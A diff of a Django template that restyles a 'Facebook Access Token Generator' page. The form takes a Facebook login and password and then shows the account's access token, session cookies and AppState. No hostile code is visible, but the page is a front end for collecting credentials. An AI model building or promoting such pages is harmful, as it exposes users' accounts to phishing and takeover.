@@ -2,155 +2,543 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Token Generator</title>
-<style>
-body {
-    font-family: 'Segoe UI', sans-serif;
-    background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-    color: #e0e0e0;
-    padding: 30px 20px;
-    line-height: 1.6;
-}
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #00e5ff;
+            --primary-dark: #00bcd4;
+            --primary-light: #4df8ff;
+            --secondary-color: #6c5ce7;
+            --background-start: #0a0a0a;
+            --background-middle: #1a1a2e;
+            --background-end: #16213e;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.18);
+            --text-primary: #ffffff;
+            --text-secondary: #b8c5d1;
+            --text-muted: #8895a7;
+            --success-color: #00d4aa;
+            --error-color: #ff6b6b;
+            --shadow-light: rgba(0, 229, 255, 0.15);
+            --shadow-medium: rgba(0, 229, 255, 0.25);
+            --shadow-heavy: rgba(0, 0, 0, 0.4);
+        }
 
-h2 {
-    font-size: 28px;
-    margin-bottom: 25px;
-    color: #00e5ff;
-    text-align: center;
-    text-shadow: 0 0 8px rgba(0, 229, 255, 0.5);
-}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-.wrapper {
-    background: rgba(28, 28, 28, 0.95);
-    padding: 30px 25px;
-    border-radius: 15px;
-    width: 100%;
-    max-width: 100%;
-    margin: 60px auto;
-    box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
-    backdrop-filter: blur(8px);
-}
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, var(--background-start) 0%, var(--background-middle) 50%, var(--background-end) 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+            position: relative;
+            overflow-x: hidden;
+        }
 
-input, button, textarea {
-    width: 100%;
-    padding: 12px 14px;
-    margin-top: 12px;
-    border-radius: 10px;
-    border: none;
-    font-size: 16px;
-    box-sizing: border-box;
-    background-color: #111;
-    color: #f1f1f1;
-    transition: 0.3s ease;
-    box-shadow: inset 0 0 5px rgba(255, 255, 255, 0.05);
-}
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
 
-input::placeholder,
-textarea::placeholder {
-    color: #aaa;
-}
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+            opacity: 0.6;
+        }
 
-input:focus, textarea:focus {
-    outline: none;
-    background-color: #1a1a1a;
-    box-shadow: 0 0 6px #00e5ff;
-}
+        .particle:nth-child(odd) {
+            background: var(--secondary-color);
+            animation-duration: 20s;
+        }
 
-button[type="submit"] {
-    background: linear-gradient(to right, #00e5ff, #00c6ff);
-    color: #fff;
-    font-weight: bold;
-    cursor: pointer;
-    transition: 0.3s ease;
-    box-shadow: 0 0 8px rgba(0, 229, 255, 0.5);
-}
+        .particle:nth-child(3n) {
+            width: 3px;
+            height: 3px;
+            animation-duration: 25s;
+        }
 
-button[type="submit"]:hover {
-    background: linear-gradient(to right, #00bcd4, #0097a7);
-    box-shadow: 0 0 10px rgba(0, 229, 255, 0.7);
-}
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) translateX(0px) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.6;
+            }
+            90% {
+                opacity: 0.6;
+            }
+            100% {
+                transform: translateY(-100px) translateX(100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
 
-button.copy-btn {
-    width: auto;
-    background: #222;
-    color: #eee;
-    margin-top: 5px;
-    font-size: 14px;
-    float: right;
-    padding: 6px 14px;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: 0.3s ease;
-    border: 1px solid #00bcd4;
-}
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
 
-button.copy-btn:hover {
-    background: #00bcd4;
-    color: #fff;
-}
+        .wrapper {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 40px;
+            margin: 40px 0;
+            box-shadow: 
+                0 8px 32px var(--shadow-heavy),
+                0 0 0 1px var(--glass-border),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            animation: slideInUp 0.8s ease-out;
+        }
 
-textarea {
-    resize: vertical;
-    min-height: 80px;
-    max-height: 300px;
-    margin-bottom: 5px;
-    font-family: monospace;
-}
+        .wrapper::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+            opacity: 0.6;
+        }
 
-#token { min-height: 170px; }
-#cuser { min-height: 50px; }
-#cookie { min-height: 170px; }
-#appstate { min-height: 380px; }
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-label {
-    margin-top: 18px;
-    display: block;
-    font-weight: bold;
-    color: #ddd;
-    text-shadow: 0 0 3px #00bcd4;
-}
+        h2 {
+            font-size: clamp(24px, 5vw, 32px);
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: var(--text-primary);
+            text-align: center;
+            position: relative;
+            letter-spacing: -0.02em;
+        }
 
-::selection {
-    background: #00bcd4;
-    color: #fff;
-}
-</style>
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            border-radius: 2px;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 5px var(--primary-color);
+            }
+            to {
+                box-shadow: 0 0 20px var(--primary-color), 0 0 30px var(--primary-color);
+            }
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        input, button, textarea {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 16px;
+            font-family: inherit;
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-primary);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        input::placeholder,
+        textarea::placeholder {
+            color: var(--text-muted);
+            font-weight: 400;
+        }
+
+        input:focus,
+        textarea:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: var(--primary-color);
+            box-shadow: 
+                0 0 0 3px rgba(0, 229, 255, 0.1),
+                0 8px 25px rgba(0, 229, 255, 0.15);
+            transform: translateY(-2px);
+        }
+
+        button[type="submit"] {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--text-primary);
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            margin-top: 8px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        button[type="submit"]:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 12px 35px rgba(0, 229, 255, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.1);
+        }
+
+        button[type="submit"]:active {
+            transform: translateY(-1px);
+        }
+
+        button[type="submit"]::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transition: width 0.6s, height 0.6s;
+            transform: translate(-50%, -50%);
+            z-index: 0;
+        }
+
+        button[type="submit"]:active::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        button[type="submit"] span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .loading {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid var(--text-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .results-section {
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .results-section.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        label {
+            display: block;
+            margin: 24px 0 8px 0;
+            font-weight: 600;
+            color: var(--text-secondary);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+        }
+
+        label::before {
+            content: '';
+            position: absolute;
+            left: -16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 8px;
+            height: 8px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--primary-color);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+            max-height: 300px;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+
+        #token { min-height: 170px; }
+        #cuser { min-height: 50px; }
+        #cookie { min-height: 170px; }
+        #appstate { min-height: 380px; }
+
+        .copy-btn {
+            width: auto !important;
+            background: rgba(255, 255, 255, 0.08) !important;
+            color: var(--text-secondary) !important;
+            margin: 0 0 0 auto !important;
+            font-size: 14px !important;
+            float: right;
+            padding: 8px 16px !important;
+            border-radius: 10px !important;
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
+            transition: all 0.3s ease !important;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-color) !important;
+            color: var(--background-start) !important;
+            border-color: var(--primary-color) !important;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0, 229, 255, 0.3);
+        }
+
+        .copy-btn.copied {
+            background: var(--success-color) !important;
+            color: white !important;
+            border-color: var(--success-color) !important;
+        }
+
+        .error-message {
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid rgba(255, 107, 107, 0.3);
+            color: var(--error-color);
+            padding: 16px 20px;
+            border-radius: 12px;
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+   
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: var(--text-muted);
+            font-size: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .wrapper {
+                padding: 24px;
+                margin: 20px 0;
+                border-radius: 20px;
+            }
+            
+            h2 {
+                font-size: 24px;
+                margin-bottom: 24px;
+            }
+            
+            input, button, textarea {
+                padding: 14px 16px;
+                font-size: 16px; /* Prevent zoom on iOS */
+            }
+        }
+
+        ::selection {
+            background: var(--primary-color);
+            color: var(--background-start);
+        }
+
+        ::-moz-selection {
+            background: var(--primary-color);
+            color: var(--background-start);
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-color);
+        }
+    </style>
 </head>
 <body>
-    <div class="wrapper">
-    <h2>Facebook Access Token Generator</h2>
-    <form method="post">
-        {% csrf_token %}
-        <input type="text" name="email" placeholder="Facebook Email / Phone / UID" required>
-        <input type="password" name="password" placeholder="Facebook Password" required>
-        <button type="submit">Generate</button>
-    </form>
+    <div class="particles">
+        <div class="particle" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="particle" style="left: 20%; animation-delay: 2s;"></div>
+        <div class="particle" style="left: 30%; animation-delay: 4s;"></div>
+        <div class="particle" style="left: 40%; animation-delay: 6s;"></div>
+        <div class="particle" style="left: 50%; animation-delay: 8s;"></div>
+        <div class="particle" style="left: 60%; animation-delay: 10s;"></div>
+        <div class="particle" style="left: 70%; animation-delay: 12s;"></div>
+        <div class="particle" style="left: 80%; animation-delay: 14s;"></div>
+        <div class="particle" style="left: 90%; animation-delay: 16s;"></div>
+        <div class="particle" style="left: 15%; animation-delay: 1s;"></div>
+        <div class="particle" style="left: 25%; animation-delay: 3s;"></div>
+        <div class="particle" style="left: 35%; animation-delay: 5s;"></div>
+        <div class="particle" style="left: 45%; animation-delay: 7s;"></div>
+        <div class="particle" style="left: 55%; animation-delay: 9s;"></div>
+        <div class="particle" style="left: 65%; animation-delay: 11s;"></div>
+        <div class="particle" style="left: 75%; animation-delay: 13s;"></div>
+        <div class="particle" style="left: 85%; animation-delay: 15s;"></div>
+    </div>
+
+    <div class="container">
+        <div class="wrapper">
+            <h2>Facebook Access Token Generator</h2>
+            <form method="post" id="tokenForm">
+                {% csrf_token %}
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Facebook Email / Phone / UID" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Facebook Password" required>
+                </div>
+                <button type="submit" id="submitBtn">
+                    <span class="btn-text">Generate Token</span>
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        <span>Generating...</span>
+                    </div>
+                </button>
+            </form>
+
+            {% if error %}
+                <div class="error-message">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    {{ error }}
+                </div>
+            {% endif %}
         </div>
-    {% if error %}
-        <div style="color: red; margin-top: 10px;">{{ error }}</div>
-    {% endif %}
 
-    {% if result %}
-        <label>Access Token:</label>
-        <textarea id="token" readonly>{{ result.token }}</textarea>
-        <button class="copy-btn" onclick="copyToClipboard('token', this)">Copy</button>
+        {% if result %}
+            <div class="wrapper results-section show">
+                <label><i class="fas fa-key"></i> Access Token:</label>
+                <textarea id="token" readonly>{{ result.token }}</textarea>
+                <button class="copy-btn" onclick="copyToClipboard('token', this)">
+                    <i class="fas fa-copy"></i>
+                    Copy
+                </button>
 
-        <label>Cookie:</label>
-        <textarea id="cookie" readonly>{{ result.cookie }}</textarea>
-        <button class="copy-btn" onclick="copyToClipboard('cookie', this)">Copy</button>
+                <label><i class="fas fa-cookie-bite"></i> Cookie:</label>
+                <textarea id="cookie" readonly>{{ result.cookie }}</textarea>
+                <button class="copy-btn" onclick="copyToClipboard('cookie', this)">
+                    <i class="fas fa-copy"></i>
+                    Copy
+                </button>
 
-        <label>c_user:</label>
-        <textarea id="cuser" readonly>{{ result.c_user }}</textarea>
-        <button class="copy-btn" onclick="copyToClipboard('cuser', this)">Copy</button>
+                <label><i class="fas fa-user"></i> c_user:</label>
+                <textarea id="cuser" readonly>{{ result.c_user }}</textarea>
+                <button class="copy-btn" onclick="copyToClipboard('cuser', this)">
+                    <i class="fas fa-copy"></i>
+                    Copy
+                </button>
 
-        <label>datr:</label>
-        <textarea id="datr" readonly>{{ result.datr }}</textarea>
-        <button class="copy-btn" onclick="copyToClipboard('datr', this)">Copy</button>
+                <label><i class="fas fa-database"></i> datr:</label>
+                <textarea id="datr" readonly>{{ result.datr }}</textarea>
+                <button class="copy-btn" onclick="copyToClipboard('datr', this)">
+                    <i class="fas fa-copy"></i>
+                    Copy
+                </button>
 
-        <label>AppState:</label>
-        <textarea id="appstate" readonly>{{ result.appstate }}</textarea>
-        <button class="copy-btn" onclick="copyToClipboard('appstate', this)">Copy</button>
-    {% endif %}
+                <label><i class="fas fa-cogs"></i> AppState:</label>
+                <textarea id="appstate" readonly>{{ result.appstate }}</textarea>
+                <button class="copy-btn" onclick="copyToClipboard('appstate', this)">
+                    <i class="fas fa-copy"></i>
+                    Copy
+                </button>
+            </div>
+        {% endif %}
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2025 Luffy. All rights reserved.</p>
+    </div>
     
     <script>
         function copyToClipboard(id, btn) {
@@ -158,15 +546,50 @@ label {
             textArea.select();
             textArea.setSelectionRange(0, 99999); // Mobile support
             document.execCommand("copy");
-            const originalText = btn.textContent;
-            btn.textContent = "Copied!";
+            
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+            btn.classList.add('copied');
+            
             setTimeout(() => {
-                btn.textContent = originalText;
-            }, 1000);
+                btn.innerHTML = originalHTML;
+                btn.classList.remove('copied');
+            }, 2000);
         }
+
+        document.getElementById('tokenForm').addEventListener('submit', function(e) {
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = submitBtn.querySelector('.btn-text');
+            const loading = submitBtn.querySelector('.loading');
+            
+            btnText.style.display = 'none';
+            loading.style.display = 'flex';
+            submitBtn.disabled = true;
+        });
+
+        if (document.querySelector('.results-section')) {
+            setTimeout(() => {
+                document.querySelector('.results-section').scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+            }, 300);
+        }
+
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 20 + 's';
+            particle.style.animationDuration = (Math.random() * 10 + 15) + 's';
+            document.querySelector('.particles').appendChild(particle);
+
+            setTimeout(() => {
+                particle.remove();
+            }, 25000);
+        }
+
+        setInterval(createParticle, 3000);
     </script>
 </body>
-<p style="text-align: center; font-size: 14px; color: gray;">
-  &copy; 2025 Luffy. All rights reserved.
-</p>
 </html>
